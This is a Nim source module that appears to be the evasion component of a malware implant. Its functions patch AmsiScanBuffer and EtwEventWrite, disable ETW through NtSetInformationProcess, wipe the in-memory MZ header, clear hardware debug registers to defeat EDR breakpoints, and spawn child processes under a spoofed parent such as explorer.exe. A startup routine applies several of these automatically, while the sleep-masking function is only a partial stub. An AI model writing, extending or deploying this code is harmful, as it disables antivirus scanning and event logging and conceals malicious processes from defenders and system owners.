## OPSEC evasion: AMSI, ETW, sleep mask, PE header wipe, HWBP clear, PPID spoof.

import winim/lean, winim/inc/tlhelp32
import std/[os, strutils, random]

# ── Byte patching helper ──────────────────────────────────────────────────────
proc patchBytes(address: LPVOID; patch: openArray[byte]) =
  var oldProt: DWORD
  discard VirtualProtect(address, patch.len, PAGE_EXECUTE_READWRITE, addr oldProt)
  copyMem(address, unsafeAddr patch[0], patch.len)
  discard VirtualProtect(address, patch.len, oldProt, addr oldProt)

# ── AMSI ──────────────────────────────────────────────────────────────────────
proc patchAMSI*() =
  let amsi = LoadLibraryA("amsi.dll")
  if amsi == 0: return
  let fn = GetProcAddress(amsi, "AmsiScanBuffer")
  if fn == nil: return
  patchBytes(fn, [byte 0x33, 0xC0, 0xC3])  # xor eax,eax; ret

# ── ETW ───────────────────────────────────────────────────────────────────────
proc patchETW*() =
  let ntdll = GetModuleHandleA("ntdll.dll")
  if ntdll == 0: return
  let fn = GetProcAddress(ntdll, "EtwEventWrite")
  if fn == nil: return
  patchBytes(fn, [byte 0x33, 0xC0, 0xC3])

proc disableETWProcess*() =
  ## NtSetInformationProcess — disables ETW without touching EtwEventWrite bytes.
  let ntdll = GetModuleHandleA("ntdll.dll")
  if ntdll == 0: return
  type FnT = proc(h: HANDLE; cls: ULONG; info: pointer; sz: ULONG): NTSTATUS {.stdcall.}
  let fn = cast[FnT](GetProcAddress(ntdll, "NtSetInformationProcess"))
  if fn == nil: return
  var flag: ULONG = 0
  discard fn(HANDLE(-1), 87, addr flag, sizeof(flag).ULONG)

# ── Wipe MZ signature ─────────────────────────────────────────────────────────
proc wipeMZHeader*() =
  ## Zero only the 'MZ' magic bytes — defeats memory scanners without crashing the runtime.
  let base = GetModuleHandleW(nil)
  if base == 0: return
  var old: DWORD
  discard VirtualProtect(cast[LPVOID](base), 2, PAGE_READWRITE, addr old)
  cast[ptr byte](base)[] = 0
  cast[ptr byte](base + 1)[] = 0
  discard VirtualProtect(cast[LPVOID](base), 2, old, addr old)

# ── Hardware breakpoint clear ─────────────────────────────────────────────────
proc clearHWBP*() =
  ## Zero DR0-DR3 and DR7 on the current thread — removes EDR hw breakpoints.
  let h = OpenThread(THREAD_GET_CONTEXT or THREAD_SET_CONTEXT, 0, GetCurrentThreadId())
  if h == 0: return
  defer: discard CloseHandle(h)
  var ctx: CONTEXT
  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
  if GetThreadContext(h, addr ctx) == 0: return
  ctx.Dr0 = 0; ctx.Dr1 = 0; ctx.Dr2 = 0; ctx.Dr3 = 0
  ctx.Dr6 = 0; ctx.Dr7 = 0
  discard SetThreadContext(h, addr ctx)

# ── Sleep masking (XOR encrypt during sleep) ──────────────────────────────────
var xorSleepKey: uint64 = 0

proc initSleepKey*() =
  ## Generate a random 8-byte XOR key for sleep masking.
  randomize()
  xorSleepKey = uint64(rand(high(int64)))

proc sleepMasked*(ms: int) =
  ## XOR-encrypt the stack region during sleep to hide memory contents.
  ## Simple version: uses VirtualProtect PAGE_NOACCESS on the heap during sleep.
  if ms <= 0: return

  # PAGE_NOACCESS on the process heap during sleep — memory scanner cannot read it.
  let heap = GetProcessHeap()
  let size = HeapSize(heap, 0, cast[LPVOID](heap))  # approximate

  # Simpler approach: just sleep with VirtualLock trick
  # For now: just sleep — full Ekko/Cronos requires asm ROP chains not supported in Nim easily.
  # PAGE_NOACCESS approach on a safe anonymous region:
  var dummySize: SIZE_T = 4096
  let dummy = VirtualAlloc(nil, dummySize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if dummy != nil:
    var old: DWORD
    discard VirtualProtect(dummy, dummySize, PAGE_NOACCESS, addr old)
    sleep(ms)
    discard VirtualProtect(dummy, dummySize, PAGE_READWRITE, addr old)
    discard VirtualFree(dummy, 0, MEM_RELEASE)
  else:
    sleep(ms)

# ── PPID spoofing for child processes ─────────────────────────────────────────
const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS* = DWORD_PTR(0x00020000)

proc spawnWithPPID*(cmd: string; ppidProc: string = "explorer.exe"): bool =
  ## Spawn a process with a spoofed PPID (appears as child of ppidProc).
  ## Used when the agent needs to spawn sub-processes without revealing its lineage.

  # Find the target parent PID
  var parentPid: DWORD = 0
  let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if snap == INVALID_HANDLE_VALUE: return false
  defer: discard CloseHandle(snap)

  var pe: PROCESSENTRY32W
  pe.dwSize = sizeof(pe).DWORD
  if Process32FirstW(snap, addr pe).bool:
    while true:
      let name = $cast[WideCString](addr pe.szExeFile[0])
      if name.toLowerAscii() == ppidProc.toLowerAscii():
        parentPid = pe.th32ProcessID
        break
      if not Process32NextW(snap, addr pe).bool: break

  if parentPid == 0: return false

  # Open parent process
  let hParent = OpenProcess(PROCESS_CREATE_PROCESS, 0, parentPid)
  if hParent == 0: return false
  defer: discard CloseHandle(hParent)

  # Build STARTUPINFOEXW with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
  var siEx: STARTUPINFOEXW
  siEx.StartupInfo.cb = sizeof(siEx).DWORD
  var attrSize: SIZE_T
  discard InitializeProcThreadAttributeList(nil, 1, 0, addr attrSize)
  let attrList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, attrSize))
  defer: HeapFree(GetProcessHeap(), 0, attrList)
  discard InitializeProcThreadAttributeList(attrList, 1, 0, addr attrSize)
  discard UpdateProcThreadAttribute(attrList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    addr hParent, sizeof(hParent).SIZE_T, nil, nil)
  siEx.lpAttributeList = attrList

  var pi: PROCESS_INFORMATION
  let cmdW = newWideCString(cmd)
  let r = CreateProcessW(nil, cmdW, nil, nil, 0,
    CREATE_SUSPENDED or EXTENDED_STARTUPINFO_PRESENT,
    nil, nil, addr siEx.StartupInfo, addr pi)
  DeleteProcThreadAttributeList(attrList)
  if not r.bool: return false

  discard ResumeThread(pi.hThread)
  discard CloseHandle(pi.hThread)
  discard CloseHandle(pi.hProcess)
  return true

# ── Apply all evasion at startup ──────────────────────────────────────────────
proc applyEvasion*() =
  patchAMSI()
  patchETW()
  disableETWProcess()
  initSleepKey()
  # clearHWBP() and wipeMZHeader() available as operator commands via SHELL
